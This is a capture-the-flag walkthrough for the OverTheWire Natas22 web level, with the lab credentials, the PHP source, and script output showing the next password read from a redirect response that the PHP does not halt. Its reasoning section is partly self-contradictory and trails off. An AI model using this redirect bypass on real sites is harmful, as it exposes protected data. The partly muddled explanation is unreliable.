# Natas22 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas22
Password: d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz
URL:      http://natas22.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- This is a cool main page:

  <img src="https://github.com/mauzware/OverTheWire-Natas/blob/main/natas22/main.png"/>

- Source code:

  ```
  <?php
  session_start();
  
  if(array_key_exists("revelio", $_GET)) {
      // only admins can reveal the password
      if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
      header("Location: /");
      }
  }
  ?>
  
  
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas22", "pass": "<censored>" };</script></head>
  <body>
  <h1>natas22</h1>
  <div id="content">
  
  <?php
      if(array_key_exists("revelio", $_GET)) {
      print "You are an admin. The credentials for the next level are:<br>";
      print "<pre>Username: natas23\n";
      print "Password: <censored></pre>";
      }
  ?>
  
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

- You have to access `?revelio=1` endpoint, but when you visit that endpoint you will be redirected. So, I wrote a script that just hit that endpoint and get the response from the server.

  ```
  $ python3 natas22.py          
  302
  /
  
  
  <html>
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
  <body>
  <h1>natas22</h1>
  <div id="content">
  You are an admin. The credentials for the next level are:<br><pre>Username: natas23
  Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

## Natas22 Logic Recap

Here’s the relevant PHP again:

```
session_start();

if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
```

## Interpretation:

- If you visit `?revelio=1` and you're **not** admin → **redirect to `/`** (blank page).
- If you are admin → you’ll see:
    
    ```
    You are an admin. The credentials for the next level are:
    Username: natas23
    Password: ...
    ```
    
So the goal is:

1. Become `admin=1` in the session.
2. Prevent being redirected.
3. Access `/index.php?revelio=1` **without following the redirect.**

But more realistically: the server is **expecting that `$_SESSION['admin'] = 1`**, so you need a **way to start a session with that set** — either:

- a vulnerable POST form that lets you set session values (like `admin=1`)
- or you manipulate `PHPSESSID` directly **on a vulnerable server-side session handler**.

In this case, if there’s **no form or way to set `$_SESSION['admin']`**, **then you're expected to do this**:

## Why this works:

- The page **returns a `302 Redirect`** before you see the message.
- But in the raw response, if you're admin, you’ll still see the full message — as long as you stop the redirect.

---

## 🏁 Password for the next level

`Password for natas23 is: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
